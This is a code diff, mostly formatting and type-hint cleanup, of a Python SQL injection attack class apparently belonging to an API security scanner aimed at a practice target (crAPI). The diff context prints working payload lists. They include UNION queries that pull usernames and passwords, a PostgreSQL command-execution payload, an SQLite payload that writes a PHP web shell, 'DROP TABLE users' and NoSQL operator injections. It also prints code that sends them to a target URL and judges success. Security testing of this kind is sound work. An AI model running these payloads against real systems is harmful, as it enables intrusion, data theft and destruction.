@@ -16,24 +16,23 @@ v1.0.0 Enhancements:
 
 import json
 import time
-import re
-from typing import Any, Optional
+from typing import Any
+
 import requests
 
 from ..models import (
-    AttackType,
     AttackResult,
+    AttackType,
     Endpoint,
     Parameter,
     Severity,
     Vulnerability,
-    SQLInjectionResult
 )
 
 
 class SQLInjectionAttacker:
     """Performs SQL injection attacks on API endpoints.
-    
+
     Supports multiple SQL injection techniques:
     - Error-based injection
     - Time-based blind injection
@@ -41,7 +40,7 @@ class SQLInjectionAttacker:
     - Boolean-based blind injection
     - Stacked queries
     """
-    
+
     # SQL injection payloads organized by database type and technique
     PAYLOADS = {
         # Generic payloads that work on multiple databases
@@ -66,7 +65,7 @@ class SQLInjectionAttacker:
             "' AND '1'='1",
             "' AND '1'='2",
         ],
-        
+
         # MySQL specific payloads
         "mysql": [
             # Time-based blind
@@ -94,7 +93,7 @@ class SQLInjectionAttacker:
             "' UNION SELECT @@version--",
             "' UNION SELECT version()--",
         ],
-        
+
         # PostgreSQL specific payloads
         "postgresql": [
             # Time-based blind
@@ -116,7 +115,7 @@ class SQLInjectionAttacker:
             # System commands (if superuser)
             "'; COPY (SELECT '') TO PROGRAM 'id > /tmp/pwned';--",
         ],
-        
+
         # MSSQL specific payloads
         "mssql": [
             # Time-based blind
@@ -136,7 +135,7 @@ class SQLInjectionAttacker:
             # Database info
             "' UNION SELECT name,NULL FROM master..sysdatabases--",
         ],
-        
+
         # Oracle specific payloads
         "oracle": [
             # Time-based
@@ -152,7 +151,7 @@ class SQLInjectionAttacker:
             # Data extraction
             "' UNION SELECT username,password FROM all_users--",
         ],
-        
+
         # SQLite specific payloads
         "sqlite": [
             # Time-based (not directly supported, but can use heavy queries)
@@ -167,7 +166,7 @@ class SQLInjectionAttacker:
             # File access
             "; ATTACH DATABASE '/var/www/html/shell.php' AS pwned;CREATE TABLE pwned.pwned (data text);INSERT INTO pwned.pwned VALUES('<?php system($_GET['cmd']);?>');--",
         ],
-        
+
         # NoSQL injection (MongoDB)
         "nosql": [
             # Basic operators
@@ -188,7 +187,7 @@ class SQLInjectionAttacker:
             '{"username": {"$regex": ".*"}}',
             '{"password": {"$regex": "^a"}}',
         ],
-        
+
         # Time-based payloads for blind injection detection
         "time_based": [
             # MySQL
@@ -196,7 +195,7 @@ class SQLInjectionAttacker:
             "' AND SLEEP(5) #",
             "1' AND SLEEP(5) AND '1'='1",
             "1') AND SLEEP(5) AND ('1'='1",
-            # PostgreSQL  
+            # PostgreSQL
             "'; SELECT pg_sleep(5)--",
             "' AND pg_sleep(5)--",
             "1' AND pg_sleep(5) AND '1'='1",
@@ -211,7 +210,7 @@ class SQLInjectionAttacker:
             "1'; SELECT SLEEP(5);--",
             "1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
         ],
-        
+
         # Boolean-based blind injection
         "boolean_based": [
             # True conditions
@@ -226,7 +225,7 @@ class SQLInjectionAttacker:
             "' AND 'a'='b",
             "1 AND 1=2",
         ],
-        
+
         # crAPI specific payloads
         "crapi_specific": [
             "' OR 1=1--",
@@ -235,7 +234,7 @@ class SQLInjectionAttacker:
             "' OR ''='",
         ],
     }
-    
+
     # SQL error patterns for different databases
     ERROR_PATTERNS = {
         "mysql": [
@@ -310,7 +309,7 @@ class SQLInjectionAttacker:
             "constraint failed",
         ],
     }
-    
+
     # Success indicators (data returned when shouldn't be)
     SUCCESS_PATTERNS = [
         "admin",
@@ -334,10 +333,10 @@ class SQLInjectionAttacker:
         "'; DROP TABLE users; --",
         "' OR 1=1 --",
     ]
-    
+
     def __init__(self, target_url: str, timeout: int = 10):
         """Initialize the SQL injection attacker.
-        
+
         Args:
             target_url: Base URL of the target API
             timeout: Request timeout in seconds
@@ -350,24 +349,24 @@ class SQLInjectionAttacker:
             'Accept': 'application/json, text/html, */*',
             'Accept-Language': 'en-US,en;q=0.9',
         })
-        
+
         # Store baseline responses for comparison
         self.baseline_responses: dict[str, dict] = {}
-        self._last_request_error: Optional[str] = None
-    
+        self._last_request_error: str | None = None
+
     def attack(
-        self, 
-        endpoint: Endpoint, 
-        parameters_to_test: Optional[list[str]] = None,
-        auth_token: Optional[str] = None
+        self,
+        endpoint: Endpoint,
+        parameters_to_test: list[str] | None = None,
+        auth_token: str | None = None
     ) -> list[AttackResult]:
         """Perform SQL injection attacks on an endpoint.
-        
+
         Args:
             endpoint: The endpoint to attack
             parameters_to_test: Specific parameter names to test (optional)
             auth_token: Authentication token (optional)
-            
+
         Returns:
             List of attack results
         """
@@ -441,7 +440,7 @@ class SQLInjectionAttacker:
         endpoint: Endpoint,
         param: Parameter,
         value: Any,
-    ) -> Optional[requests.Response]:
+    ) -> requests.Response | None:
         """Send a baseline or attack request for a single parameter."""
         self._last_request_error = None
         try:
@@ -500,8 +499,8 @@ class SQLInjectionAttacker:
         endpoint: Endpoint,
         param: Parameter,
         payload: str,
-        baseline_response: Optional[requests.Response],
-        attack_response: Optional[requests.Response],
+        baseline_response: requests.Response | None,
+        attack_response: requests.Response | None,
     ) -> AttackResult:
         """Build a proof-based SQL injection result from baseline and attack responses."""
         if attack_response is None:
@@ -562,32 +561,32 @@ class SQLInjectionAttacker:
                 "param_name": param.name,
             } if success else None,
         )
-    
+
     def _get_testable_parameters(
-        self, 
-        endpoint: Endpoint, 
-        parameters_to_test: Optional[list[str]]
+        self,
+        endpoint: Endpoint,
+        parameters_to_test: list[str] | None
     ) -> list[Parameter]:
         """Get list of parameters that should be tested."""
         params = []
-        
+
         # Parameter types that are commonly vulnerable
-        vulnerable_types = ['id', 'user', 'name', 'search', 'query', 'filter', 
+        vulnerable_types = ['id', 'user', 'name', 'search', 'query', 'filter',
                           'sort', 'order', 'key', 'value', 'email', 'username',
                           'password', 'token', 'code', 'ref', 'page', 'limit']
-        
+
         for param in endpoint.parameters:
             # Skip if specific parameters requested and this isn't one
             if parameters_to_test and param.name not in parameters_to_test:
                 continue
-            
+
             # Test query params, path params, and body params
             if param.location in ('query', 'path', 'body'):
                 params.append(param)
             # Also test parameters with vulnerable-sounding names
             elif any(vuln in param.name.lower() for vuln in vulnerable_types):
                 params.append(param)
-        
+
         # Check for request body parameters
         if endpoint.request_body:
             body_params = self._extract_body_parameters(endpoint.request_body)
@@ -598,33 +597,33 @@ class SQLInjectionAttacker:
                         location='body',
                         param_type='string'
                     ))
-        
+
         return params
-    
+
     def _extract_body_parameters(self, request_body: dict) -> list[str]:
         """Extract parameter names from request body schema."""
         params = []
-        
+
         content = request_body.get('content', {})
         for content_type, content_schema in content.items():
             if 'application/json' in content_type:
                 schema = content_schema.get('schema', {})
                 properties = schema.get('properties', {})
                 params.extend(properties.keys())
-        
+
         return params
-    
+
     def _establish_baselines(self, endpoint: Endpoint, params: list[Parameter]):
         """Establish baseline responses for comparison."""
         for param in params:
             try:
                 url = f"{self.target_url}{endpoint.path}"
-                
+
                 # Make normal request with benign value
                 if endpoint.method.value == 'GET':
                     response = self.session.get(
-                        url, 
-                        params={param.name: '1'}, 
+                        url,
+                        params={param.name: '1'},
                         timeout=self.timeout
                     )
                 else:
@@ -634,7 +633,7 @@ class SQLInjectionAttacker:
                         json={param.name: '1'},
                         timeout=self.timeout
                     )
-                
+
                 self.baseline_responses[param.name] = {
                     'status': response.status_code,
                     'length': len(response.text),
@@ -648,25 +647,25 @@ class SQLInjectionAttacker:
                     'text': '',
                     'time': 0.5
                 }
-    
+
     def _test_payload(
-        self, 
-        endpoint: Endpoint, 
-        param: Parameter, 
+        self,
+        endpoint: Endpoint,
+        param: Parameter,
         payload: str,
         technique: str
     ) -> AttackResult:
         """Test a single SQL injection payload."""
         start_time = time.time()
-        
+
         try:
             url = f"{self.target_url}{endpoint.path}"
-            
+
             # Build request based on method and parameter location
             params = {}
             json_body = {}
             headers = {}
-            
+
             # Add other required parameters
             for p in endpoint.parameters:
                 if p.name == param.name:
@@ -678,7 +677,7 @@ class SQLInjectionAttacker:
                     json_body[p.name] = default
                 elif p.location == 'header':
                     headers[p.name] = str(default)
-            
+
             # Inject the payload
             if param.location == 'query':
                 params[param.name] = payload
@@ -688,11 +687,11 @@ class SQLInjectionAttacker:
                 # Replace path parameter
                 from urllib.parse import quote
                 url = url.replace(f"{{{param.name}}}", quote(payload, safe=''))
-            
+
             # Make request
             if endpoint.method.value == 'GET':
                 response = self.session.get(
-                    url, 
+                    url,
                     params=params,
                     headers=headers if headers else None,
                     timeout=self.timeout
@@ -706,14 +705,14 @@ class SQLInjectionAttacker:
                     headers=headers if headers else None,
                     timeout=self.timeout
                 )
-            
+
             duration_ms = (time.time() - start_time) * 1000
-            
+
             # Check for vulnerability indicators
             is_vulnerable, db_type, evidence = self._check_vulnerability(
                 response, payload, param.name, technique
             )
-            
+
             return AttackResult(
                 endpoint=endpoint,
                 attack_type=AttackType.SQL_INJECTION,
@@ -729,7 +728,7 @@ class SQLInjectionAttacker:
                     'param_name': param.name
                 } if is_vulnerable else None
             )
-            
+
         except requests.exceptions.Timeout:
             duration_ms = (time.time() - start_time) * 1000
             return AttackResult(
@@ -750,23 +749,23 @@ class SQLInjectionAttacker:
                 error_message=str(e)[:200],
                 duration_ms=duration_ms
             )
-    
+
     def _test_time_based(
-        self, 
-        endpoint: Endpoint, 
-        param: Parameter, 
+        self,
+        endpoint: Endpoint,
+        param: Parameter,
         payload: str
     ) -> AttackResult:
         """Test for time-based blind SQL injection."""
         start_time = time.time()
-        
+
         try:
             url = f"{self.target_url}{endpoint.path}"
-            
+
             # Build request
             params = {}
             json_body = {}
-            
+
             for p in endpoint.parameters:
                 if p.name == param.name:
                     continue
@@ -775,15 +774,15 @@ class SQLInjectionAttacker:
                     params[p.name] = default
                 elif p.location == 'body':
                     json_body[p.name] = default
-            
+
             if param.location == 'query':
                 params[param.name] = payload
             elif param.location == 'body':
                 json_body[param.name] = payload
-            
+
             # Use a longer timeout for time-based tests
             request_timeout = max(self.timeout, 10)
-            
+
             if endpoint.method.value == 'GET':
                 response = self.session.get(
                     url, params=params, timeout=request_timeout
@@ -795,13 +794,13 @@ class SQLInjectionAttacker:
                     params=params if params else None,
                     timeout=request_timeout
                 )
-            
+
             duration_ms = (time.time() - start_time) * 1000
-            
+
             # Time-based detection: if response took > 5 seconds, likely vulnerable
             # (This works because payloads use SLEEP(5) or similar)
             is_vulnerable = duration_ms > 4500  # 4.5 seconds threshold
-            
+
             return AttackResult(
                 endpoint=endpoint,
                 attack_type=AttackType.SQL_INJECTION,
@@ -817,7 +816,7 @@ class SQLInjectionAttacker:
                     'param_name': param.name
                 } if is_vulnerable else None
             )
-            
+
         except requests.exceptions.Timeout:
             duration_ms = (time.time() - start_time) * 1000
             # Timeout might indicate successful time-based injection
@@ -843,25 +842,25 @@ class SQLInjectionAttacker:
                 error_message=str(e)[:200],
                 duration_ms=duration_ms
             )
-    
+
     def _test_boolean_based(
-        self, 
-        endpoint: Endpoint, 
+        self,
+        endpoint: Endpoint,
         param: Parameter
     ) -> list[AttackResult]:
         """Test for boolean-based blind SQL injection."""
         results = []
-        
+
         # Test true condition
         true_payload = "' AND 1=1--"
         true_result = self._test_payload(endpoint, param, true_payload, "boolean_true")
         results.append(true_result)
-        
+
         # Test false condition
         false_payload = "' AND 1=2--"
         false_result = self._test_payload(endpoint, param, false_payload, "boolean_false")
         results.append(false_result)
-        
+
         # Compare responses
         if (true_result.response_status == false_result.response_status and
             true_result.response_body and false_result.response_body and
@@ -873,26 +872,26 @@ class SQLInjectionAttacker:
                 'evidence': f"Response size differs: true={len(true_result.response_body)}, false={len(false_result.response_body)}",
                 'param_name': param.name
             }
-        
+
         return results
-    
+
     def _test_union_based(
-        self, 
-        endpoint: Endpoint, 
+        self,
+        endpoint: Endpoint,
         param: Parameter
     ) -> list[AttackResult]:
         """Test for UNION-based SQL injection with column detection."""
         results = []
-        
+
         # Test UNION with increasing column counts
         for num_columns in range(1, 11):
             # Build UNION payload with NULL columns
             nulls = ','.join(['NULL'] * num_columns)
             payload = f"' UNION SELECT {nulls}--"
-            
+
             result = self._test_payload(endpoint, param, payload, f"union_{num_columns}_columns")
             results.append(result)
-            
+
             # If we don't get an error with this number of columns, we found the right count
             if result.response_status == 200 and result.response_body:
                 if 'error' not in result.response_body.lower():
@@ -904,14 +903,14 @@ class SQLInjectionAttacker:
                         'param_name': param.name
                     }
                     break
-        
+
         return results
-    
+
     def _get_default_value(self, param: Parameter) -> Any:
         """Get a default value for a parameter."""
         if param.example:
             return param.example
-        
+
         defaults = {
             'string': 'test',
             'integer': 1,
@@ -921,77 +920,77 @@ class SQLInjectionAttacker:
             'object': {}
         }
         return defaults.get(param.param_type, 'test')
-    
+
     def _check_vulnerability(
-        self, 
-        response: requests.Response, 
+        self,
+        response: requests.Response,
         payload: str,
         param_name: str,
         technique: str
     ) -> tuple[bool, str, str]:
         """Check if response indicates SQL injection vulnerability.
-        
+
         Returns:
             Tuple of (is_vulnerable, database_type, evidence)
         """
         response_text = response.text.lower()
-        
+
         # Check for database-specific error patterns
         for db_type, patterns in self.ERROR_PATTERNS.items():
             for pattern in patterns:
                 if pattern.lower() in response_text:
                     return True, db_type, f"Database error pattern found: {pattern}"
-        
+
         # Check for successful status with error content
         if response.status_code == 200:
             # Check for SQL keywords in response (unusual)
             sql_keywords = ['select', 'insert', 'update', 'delete', 'drop', 'union', 'where']
             keyword_count = sum(1 for kw in sql_keywords if f' {kw} ' in response_text)
-            
+
             if keyword_count >= 2:
                 return True, 'unknown', "Multiple SQL keywords found in response"
-            
+
             # Check for sensitive data patterns
             try:
                 if response.headers.get('content-type', '').startswith('application/json'):
                     data = response.json()
                     data_str = str(data).lower()
-                    
+
                     for pattern in self.SUCCESS_PATTERNS:
                         if pattern in data_str and 'error' not in data_str:
                             return True, 'unknown', f"Sensitive data pattern found: {pattern}"
-                    
+
                     # Check for unusually large result sets
                     if isinstance(data, list) and len(data) > 100:
                         return True, 'unknown', f"Large result set returned: {len(data)} rows"
-                        
+
             except (ValueError, KeyError):
                 pass
-        
+
         # Check for different response than baseline
         baseline = self.baseline_responses.get(param_name, {})
         if baseline:
             baseline_text = baseline.get('text', '')
-            
+
             # If response is significantly different, might indicate injection
-            if (response_text and baseline_text and 
-                len(response_text) > 0 and 
+            if (response_text and baseline_text and
+                len(response_text) > 0 and
                 abs(len(response_text) - len(baseline_text)) > 100):
-                
+
                 # Check if difference is due to data vs error
                 if 'error' not in response_text and 'error' in baseline_text:
                     return True, 'unknown', "Response changed from error to success"
-        
+
         # Check for 5xx errors that might reveal SQL issues
         if response.status_code >= 500:
             if any(p in response_text for p in ['sql', 'query', 'syntax', 'database']):
                 return True, 'unknown', "Server error with SQL-related content"
-        
+
         return False, '', ''
-    
+
     def create_vulnerability(
-        self, 
-        result: AttackResult, 
+        self,
+        result: AttackResult,
         endpoint: Endpoint
     ) -> Vulnerability:
         """Create a Vulnerability object from an attack result."""
@@ -999,23 +998,23 @@ class SQLInjectionAttacker:
         db_type = 'unknown'
         evidence = ''
         param_name = ''
-        
+
         if result.extra_data:
             technique = result.extra_data.get('technique', 'error_based')
             db_type = result.extra_data.get('db_type', 'unknown')
             evidence = result.extra_data.get('evidence', '')
             param_name = result.extra_data.get('param_name', '')
-        
+
         # Determine severity based on technique
         severity = Severity.HIGH
         if technique == 'time_based_blind':
             severity = Severity.HIGH  # Blind SQLi is still very serious
         elif 'union' in technique:
             severity = Severity.CRITICAL  # Can extract all data
-        
+
         # Build description
         description = f"SQL injection vulnerability detected in parameter '{param_name}'. "
-        
+
         if technique == 'time_based_blind':
             description += (
                 f"Time-based blind SQL injection confirmed. The application is vulnerable "
@@ -1025,9 +1024,9 @@ class SQLInjectionAttacker:
             )
         elif technique == 'boolean_based_blind':
             description += (
-                f"Boolean-based blind SQL injection confirmed. The application returns "
-                f"different responses based on injected boolean conditions, allowing "
-                f"data extraction through inference."
+                "Boolean-based blind SQL injection confirmed. The application returns "
+                "different responses based on injected boolean conditions, allowing "
+                "data extraction through inference."
             )
         elif 'union' in technique:
             description += (
@@ -1041,7 +1040,7 @@ class SQLInjectionAttacker:
                 f"The application returns database error messages that can be used to "
                 f"extract sensitive information. Evidence: {evidence}"
             )
-        
+
         return Vulnerability(
             endpoint=endpoint,
             attack_type=AttackType.SQL_INJECTION,
